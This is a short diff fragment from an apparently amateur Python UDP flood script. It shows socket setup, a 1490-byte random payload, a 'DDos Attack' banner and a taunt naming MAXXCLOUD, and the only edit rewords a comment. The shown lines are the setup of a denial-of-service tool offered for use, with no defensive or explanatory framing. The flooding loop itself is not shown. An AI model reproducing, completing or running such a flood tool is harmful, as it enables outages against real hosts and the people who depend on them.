@@ -8,7 +8,7 @@ import random
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-#Schauen Ob geht sonst die 2 aus comment 
+#Test or comment 2 out // After field test 2 works fine 
 os.system("clear")
 os.system("figlet DDos Attack")
 print "Lets GO and Don't use MAXXCLOUD !"
